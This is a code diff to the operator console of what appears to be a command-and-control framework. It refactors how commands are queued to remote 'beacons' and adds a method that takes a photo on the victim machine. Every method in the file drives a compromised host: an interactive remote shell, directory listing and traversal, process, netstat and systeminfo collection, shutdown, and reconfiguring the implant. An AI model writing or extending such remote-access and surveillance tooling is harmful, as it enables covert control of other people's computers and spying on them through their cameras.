@@ -2,7 +2,7 @@ from ServerDatabase.database import DatabaseClass
 from .global_objects import (
     add_beacon_command_list,
     remove_beacon_list,
-    beacon_commands
+    command_list
 )
 
 
@@ -20,7 +20,6 @@ class BeaconCommandsClass:
         """
         closes connection from the current session within the session commands
         """
-        # confirmation to close connection
         if (input(
                 colorama.Back.RED +
                 "Are you sure want to close the connection?: Y/N ").lower()
@@ -31,7 +30,7 @@ class BeaconCommandsClass:
                 "Closing " + userID)
 
             try:
-                add_beacon_command_list(userID, "shutdown")
+                add_beacon_command_list(userID, None, "shutdown")
 
             except BaseException:  # handles ssl.SSLEOFError
                 pass
@@ -50,7 +49,7 @@ class BeaconCommandsClass:
             f"Shell {IPAddress}: Type exit to quit session, "
             "Please use absolute paths")
         command = input("Command: ")
-        add_beacon_command_list(userID, f"shell {command}")
+        add_beacon_command_list(userID, None, "shell", command)
 
     def list_dir(self, userID, IPAddress) -> None:
         """runs a shell between the sessions client and server"""
@@ -58,36 +57,41 @@ class BeaconCommandsClass:
             f"ListDir {IPAddress}: Type exit to quit session, "
             "Please use absolute paths")
         command = input("Directory: ")
-        add_beacon_command_list(userID, f"list_dir {command}")
+        add_beacon_command_list(userID, None, "list_dir", command)
 
     def list_processes(self, userID) -> None:
-        add_beacon_command_list(userID, "list_processes")
+        add_beacon_command_list(userID, None, "list_processes", "")
         return
 
     def systeminfo(self, userID) -> None:
         """gets the systeminfo of the client"""
-        add_beacon_command_list(userID, "systeminfo")
+        add_beacon_command_list(userID, None, "systeminfo", "")
         return
 
     def disk_usage(self, userID) -> None:
-        add_beacon_command_list(userID, "disk_usage")
+        add_beacon_command_list(userID, None, "disk_usage", "")
         return
-    
+
     def dir_traversal(self, userID) -> None:
-        add_beacon_command_list(userID, "directory_traversal")
+        add_beacon_command_list(userID, None, "directory_traversal", "")
         return
 
     def netstat(self, userID) -> None:
-        add_beacon_command_list(userID, "disk_usage")
+        add_beacon_command_list(userID, None, "netstat", "")
+        return
+
+    def takePhoto(self, userID) -> None:
+        add_beacon_command_list(userID, None, "snap", "")
         return
 
     def list_db_commands(self, userID) -> None:
-        for j in range(len(beacon_commands["beacon_uuid"])):
-            if beacon_commands["beacon_uuid"][j] == userID:
-                print(f"""Command ID: {beacon_commands["command_uuid"][j]}
-                    Command: {beacon_commands["command"][j]}
-                    Response: {beacon_commands["command_output"][j]}""")
-    
+        for _, beacon_commands in command_list.items():
+            if beacon_commands.beacon_uuid == userID:
+                print(f"""Command ID: {beacon_commands.command_uuid}
+                    Command: {beacon_commands.command}
+                    Response: {beacon_commands.command_output if beacon_commands.command_output else "Awaiting Response"}""") # noqa
+        return
+
     def beacon_configueration(self, userID) -> None:
         data = {}
         additional_data = "y"
@@ -104,5 +108,5 @@ class BeaconCommandsClass:
                 continue
             else:
                 break
-        add_beacon_command_list(userID, "beacon_configueration", data)
+        add_beacon_command_list(userID, None, "beacon_configueration", data)
         return
